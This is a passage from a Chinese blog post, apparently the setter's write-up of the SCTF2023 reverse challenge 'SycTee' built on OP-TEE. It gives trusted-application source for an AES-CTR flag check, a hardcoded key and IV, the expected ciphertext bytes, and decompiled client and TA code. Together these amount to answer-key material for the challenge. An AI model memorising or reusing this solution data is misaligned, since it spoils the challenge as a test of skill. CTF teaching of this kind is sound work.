(BJ888256_KEY_BIT_SIZE / 8)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TEE_Result <span class="title function_">set_bj888_key</span><span class="params">(<span class="type">void</span> *session, <span class="type">uint32_t</span> param_types,</span></span><br><span class="line"><span class="params">				TEE_Param params[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">uint32_t</span> exp_param_types =</span><br><span class="line">		TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,</span><br><span class="line">				TEE_PARAM_TYPE_NONE,</span><br><span class="line">				TEE_PARAM_TYPE_NONE,</span><br><span class="line">				TEE_PARAM_TYPE_NONE);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bj888_cipher</span> *<span class="title">sess</span>;</span></span><br><span class="line">	TEE_Attribute attr;</span><br><span class="line">	TEE_Result res;</span><br><span class="line">	<span class="type">uint32_t</span> key_sz1;</span><br><span class="line">	<span class="type">char</span> *key1;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get ciphering context from session ID */</span></span><br><span class="line">	DMSG(<span class="string">&quot;Session %p: load &quot;</span>, session);</span><br><span class="line">	sess = (<span class="keyword">struct</span> bj888_cipher *)session;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Safely get the invocation parameters */</span></span><br><span class="line">	<span class="keyword">if</span> (param_types != exp_param_types)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line"></span><br><span class="line">	key1 = params[<span class="number">0</span>].memref.buffer;</span><br><span class="line">	key_sz1 = params[<span class="number">0</span>].memref.size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key_sz1 != sess-&gt;key_size) &#123;</span><br><span class="line">		EMSG(<span class="string">&quot;Wrong size %&quot;</span> PRIu32 <span class="string">&quot;, expect %&quot;</span> PRIu32 <span class="string">&quot; bytes&quot;</span>,</span><br><span class="line">		     key_sz1, sess-&gt;key_size);</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Load the key material into the configured operation</span></span><br><span class="line"><span class="comment">	 * - create a secret key attribute with the key material</span></span><br><span class="line"><span class="comment">	 *   TEE_InitRefAttribute()</span></span><br><span class="line"><span class="comment">	 * - reset transient object and load attribute data</span></span><br><span class="line"><span class="comment">	 *   TEE_ResetTransientObject()</span></span><br><span class="line"><span class="comment">	 *   TEE_PopulateTransientObject()</span></span><br><span class="line"><span class="comment">	 * - load the key (transient object) into the ciphering operation</span></span><br><span class="line"><span class="comment">	 *   TEE_SetOperationKey()</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * TEE_SetOperationKey() requires operation to be in &quot;initial state&quot;.</span></span><br><span class="line"><span class="comment">	 * We can use TEE_ResetOperation() to reset the operation but this</span></span><br><span class="line"><span class="comment">	 * API cannot be used on operation with key(s) not yet set. Hence,</span></span><br><span class="line"><span class="comment">	 * when allocating the operation handle, we load a dummy key.</span></span><br><span class="line"><span class="comment">	 * Thus, set_key sequence always reset then set key on operation.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	 <span class="comment">//bj888默认一个key</span></span><br><span class="line">	<span class="comment">//char *key = &quot;snbjklefsdcvfsyc&quot;;</span></span><br><span class="line">	<span class="comment">//uint32_t key_sz = 16;</span></span><br><span class="line">	TEE_InitRefAttribute(&amp;attr, TEE_ATTR_SECRET_VALUE, key1, key_sz1);</span><br><span class="line"></span><br><span class="line">	TEE_ResetTransientObject(sess-&gt;key_handle);</span><br><span class="line">	res = TEE_PopulateTransientObject(sess-&gt;key_handle, &amp;attr, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (res != TEE_SUCCESS) &#123;</span><br><span class="line">		EMSG(<span class="string">&quot;TEE failed, %x&quot;</span>, res);</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	TEE_ResetOperation(sess-&gt;op_handle);</span><br><span class="line">	res = TEE_SetOperationKey(sess-&gt;op_handle, sess-&gt;key_handle);</span><br><span class="line">	<span class="keyword">if</span> (res != TEE_SUCCESS) &#123;</span><br><span class="line">		EMSG(<span class="string">&quot;TEE failed %x&quot;</span>, res);</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Process command TA_BJ888_CMD_SET_IV. API in bj888_ta.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> TEE_Result <span class="title function_">reset_bj888_iv</span><span class="params">(<span class="type">void</span> *session, <span class="type">uint32_t</span> param_types,</span></span><br><span class="line"><span class="params">				TEE_Param params[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">uint32_t</span> exp_param_types =</span><br><span class="line">		TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,</span><br><span class="line">				TEE_PARAM_TYPE_NONE,</span><br><span class="line">				TEE_PARAM_TYPE_NONE,</span><br><span class="line">				TEE_PARAM_TYPE_NONE);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bj888_cipher</span> *<span class="title">sess</span>;</span></span><br><span class="line">	<span class="type">size_t</span> iv_sz1;</span><br><span class="line">	<span class="type">char</span> *iv1;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get ciphering context from session ID */</span></span><br><span class="line">	DMSG(<span class="string">&quot;Session %p: no hint&quot;</span>, session);</span><br><span class="line">	sess = (<span class="keyword">struct</span> bj888_cipher *)session;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Safely get the invocation parameters */</span></span><br><span class="line">	<span class="keyword">if</span> (param_types != exp_param_types)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line"></span><br><span class="line">	iv1 = params[<span class="number">0</span>].memref.buffer;</span><br><span class="line">	iv_sz1 = params[<span class="number">0</span>].memref.size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Init cipher operation with the initialization vector.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="comment">//char *iv = &quot;snbjklefsdcvfsyc&quot;;</span></span><br><span class="line">	<span class="comment">//uint32_t iv_sz = 16;</span></span><br><span class="line">	TEE_CipherInit(sess-&gt;op_handle, iv1, iv_sz1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TEE_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Process command TA_BJ888_CMD_CIPHER. API in bj888_ta.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> TEE_Result <span class="title function_">cipher_buffer</span><span class="params">(<span class="type">void</span> *session, <span class="type">uint32_t</span> param_types,</span></span><br><span class="line"><span class="params">				TEE_Param params[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">uint32_t</span> exp_param_types =</span><br><span class="line">		TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INPUT,</span><br><span class="line">				TEE_PARAM_TYPE_MEMREF_OUTPUT,</span><br><span class="line">				TEE_PARAM_TYPE_NONE,</span><br><span class="line">				TEE_PARAM_TYPE_NONE);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bj888_cipher</span> *<span class="title">sess</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get ciphering context from session ID */</span></span><br><span class="line">	DMSG(<span class="string">&quot;Session %p: no hints&quot;</span>, session);</span><br><span class="line">	sess = (<span class="keyword">struct</span> bj888_cipher *)session;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Safely get the invocation parameters */</span></span><br><span class="line">	<span class="keyword">if</span> (param_types != exp_param_types)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (params[<span class="number">1</span>].memref.size &lt; params[<span class="number">0</span>].memref.size) &#123;</span><br><span class="line">		EMSG(<span class="string">&quot;Bad sizes: in %d, out %d&quot;</span>, params[<span class="number">0</span>].memref.size,</span><br><span class="line">						 params[<span class="number">1</span>].memref.size);</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sess-&gt;op_handle == TEE_HANDLE_NULL)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_STATE;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *cipher = (<span class="type">const</span> <span class="type">char</span> *)(params[<span class="number">0</span>].memref.buffer);</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> cipher_len = <span class="built_in">strlen</span>(cipher);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Process ciphering operation on provided buffers</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	TEE_CipherUpdate(sess-&gt;op_handle,</span><br><span class="line">				params[<span class="number">0</span>].memref.buffer, params[<span class="number">0</span>].memref.size,</span><br><span class="line">				params[<span class="number">1</span>].memref.buffer, &amp;params[<span class="number">1</span>].memref.size);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *en = (<span class="type">const</span> <span class="type">char</span> *)(params[<span class="number">1</span>].memref.buffer);</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> en_len = <span class="number">27</span>;</span><br><span class="line">	<span class="comment">//char cmp[] = &#123;0x20,0x0b,0x1c,0xff,0xc5,0xa4,0x0a,0xfe,0x31,0x10,0x9d,0x67,0xfe,0xf5,0x60,0xa9,0x9e,0xc6,0x44,0x93,0x36,0xa4,0xfd,0xe9,0x37,0x9d,0x07,0xf1,0x50,0xcc,0x84,0x95&#125;;</span></span><br><span class="line">	<span class="type">char</span> cmp[<span class="number">27</span>] = &#123;<span class="number">0x25</span>,<span class="number">0x03</span>,<span class="number">0x0a</span>,<span class="number">0x6c</span>,<span class="number">0xf8</span>,<span class="number">0xb1</span>,<span class="number">0xce</span>,<span class="number">0x7f</span>,<span class="number">0xc9</span>,<span class="number">0x42</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x68</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0x04</span>,<span class="number">0x64</span>,<span class="number">0xfa</span>,<span class="number">0xe5</span>,<span class="number">0xa4</span>,<span class="number">0x22</span>,<span class="number">0xd4</span>,<span class="number">0x2c</span>,<span class="number">0xff</span>,<span class="number">0x4e</span>,<span class="number">0x36</span>,<span class="number">0x2a</span>&#125;; </span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(cmp[i] != en[i])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">char</span> *buf = <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">			TEE_MemMove(params[<span class="number">0</span>].memref.buffer, buf, <span class="number">6</span>);</span><br><span class="line">			TEE_Free(buf);</span><br><span class="line">			<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> *buf1 = <span class="string">&quot;right&quot;</span>;</span><br><span class="line">	TEE_MemMove(params[<span class="number">0</span>].memref.buffer, buf1, <span class="number">6</span>);</span><br><span class="line">	TEE_Free(buf1);</span><br><span class="line">	<span class="keyword">return</span> TEE_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该加密是aes的ctr加密。</p>
<h2 id="4-解题思路："><a href="#4-解题思路：" class="headerlink" title="4.解题思路："></a>4.解题思路：</h2><p>本题采用optee项目，项目文档地址：<a target="_blank" rel="noopener" href="https://optee.readthedocs.io/en/latest/">https://optee.readthedocs.io/en/latest/</a></p>
<p>该题采用arm架构，意在找出系统中关键加密文件，从而拿到flag</p>
<p>文件目录：</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C6.png" alt="6"></p>
<p><a target="_blank" rel="noopener" href="http://运行run.sh/">运行run.sh</a></p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C5.png" alt="5"></p>
<p>输入test进入测试，或者root进入系统，主要关注&#x2F;usr&#x2F;bin下可执行程序，由于optee环境中optee_example_*开头文件是源项目optee_expample文件夹下所编译文件，再对比源库，甚至可以从名字看出optee_example_bj666，optee_example_bj777，optee_example_bj888这写文件是后来写的文件</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C4.png" alt="4"></p>
<p>其实每一个文件都是有深意的，如果仔细看过optee_example_bj666代码，其实只需要找到ta文件就能逆向，而optee_example_bj777文件，是通过ca向ta传入key才可以逆向。上述两个文件也就演示了一些可信文件的基本操作。</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C3.png" alt="3"></p>
<p>找到可疑ca文件后，如何定位到ta文件也是考点之一，ta文件在&#x2F;lib&#x2F;optee_armtz目录下，以uuid开头，两种方法定位到对应uuid，第一种可以遍历目录下文件，查看字符串（如文件名bj777或者wrong）这种关键字符串。第二种通过strace可以轻松拿到对应ta文件的uuid：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bj666: <span class="number">4194350e-9204</span>-<span class="number">4348</span>-ac59-ace9f0c055af</span><br><span class="line">bj777: 372b9188-934f-469b-9bd3-124463c650bd</span><br><span class="line">bj888：045ccc45-ee83-43ec-b69f-121819c1ba6b</span><br></pre></td></tr></table></figure>

<p>从上述分析，我们只需要看bj888文件即可，先看ca文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_A30</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// x21</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">24</span>]; <span class="comment">// [xsp+30h] [xbp-2040h] BYREF</span></span><br><span class="line">  __int64 v7[<span class="number">4</span>]; <span class="comment">// [xsp+48h] [xbp-2028h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">4096</span>]; <span class="comment">// [xsp+68h] [xbp-2008h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [xsp+1068h] [xbp-1008h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = *(<span class="type">const</span> <span class="type">char</span> **)(a2 + <span class="number">8</span>);</span><br><span class="line">  qmemcpy(v7, <span class="string">&quot;snbjklefsdcvfsycsnbjklefsdcvfsyc&quot;</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8[v2] = v3[v2];</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C64(v6);</span><br><span class="line">  sub_D64(v6, <span class="number">1LL</span>);</span><br><span class="line">  sub_E14(v6, v7, <span class="number">16LL</span>);</span><br><span class="line">  sub_EB8(v6, &amp;v7[<span class="number">2</span>], <span class="number">16LL</span>);</span><br><span class="line">  sub_F40(v6, v8, &amp;v9, <span class="number">4096LL</span>);</span><br><span class="line">  sub_D3C(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该main函数向ta文件传了一个字符串，并且判断字符串长度是否为27</p>
<p>接下来是045ccc45-ee83-43ec-b69f-121819c1ba6b.ta文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1DC</span><span class="params">(<span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3, _QWORD *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// w5</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v8; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// w5</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// w5</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// w19</span></span><br><span class="line">  __int64 v12; <span class="comment">// x0</span></span><br><span class="line">  __int64 v14; <span class="comment">// x2</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// w3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// w2</span></span><br><span class="line">  __int64 v19; <span class="comment">// x0</span></span><br><span class="line">  __int64 v20; <span class="comment">// x20</span></span><br><span class="line">  __int64 v21; <span class="comment">// x3</span></span><br><span class="line">  __int64 i; <span class="comment">// x0</span></span><br><span class="line">  <span class="type">char</span> v23[<span class="number">32</span>]; <span class="comment">// [xsp+40h] [xbp+40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      sub_930(<span class="string">&quot;alloc_resources&quot;</span>, <span class="number">124LL</span>, <span class="number">3LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Session %p:&quot;</span>, a1);</span><br><span class="line">      <span class="keyword">if</span> ( a3 != <span class="number">273</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      v7 = *(_DWORD *)a4;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">272</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">528</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_930(<span class="string">&quot;ta2tee_algo_id&quot;</span>, <span class="number">70LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Invalid %u&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v8 = <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *a1 = v8 | <span class="number">0x10000000</span>;</span><br><span class="line">      v9 = *((_DWORD *)a4 + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 != <span class="number">16</span> &amp;&amp; v9 != <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_930(<span class="string">&quot;ta2tee_key_size&quot;</span>, <span class="number">82LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Invalid %u&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a1[<span class="number">2</span>] = v9;</span><br><span class="line">      v10 = *((_DWORD *)a4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v10 != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_930(<span class="string">&quot;ta2tee_mode_id&quot;</span>, <span class="number">96LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Invalid mode %u&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        a1[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)a1 + <span class="number">2</span>) )</span><br><span class="line">        sub_3018();</span><br><span class="line">      v11 = sub_305C(a1 + <span class="number">4</span>, (<span class="type">unsigned</span> <span class="type">int</span>)*a1, (<span class="type">unsigned</span> <span class="type">int</span>)a1[<span class="number">1</span>], (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">8</span> * a1[<span class="number">2</span>]));</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_930(<span class="string">&quot;alloc_resources&quot;</span>, <span class="number">160LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Failed to allocate&quot;</span>);</span><br><span class="line">        *((_QWORD *)a1 + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)a1 + <span class="number">3</span>) )</span><br><span class="line">          sub_2400();</span><br><span class="line">        v11 = sub_2380(<span class="number">2684354576LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">8</span> * a1[<span class="number">2</span>]), a1 + <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v11 )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_930(<span class="string">&quot;alloc_resources&quot;</span>, <span class="number">174LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Failed to allocate&quot;</span>);</span><br><span class="line">          *((_QWORD *)a1 + <span class="number">3</span>) = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v14 = sub_1F70((<span class="type">unsigned</span> <span class="type">int</span>)a1[<span class="number">2</span>], <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 )</span><br><span class="line">          &#123;</span><br><span class="line">            sub_2578(v23, <span class="number">3221225472LL</span>, v14, (<span class="type">unsigned</span> <span class="type">int</span>)a1[<span class="number">2</span>]);</span><br><span class="line">            v11 = sub_24A8(*((_QWORD *)a1 + <span class="number">3</span>), v23, <span class="number">1LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v11 )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_930(<span class="string">&quot;alloc_resources&quot;</span>, <span class="number">198LL</span>, <span 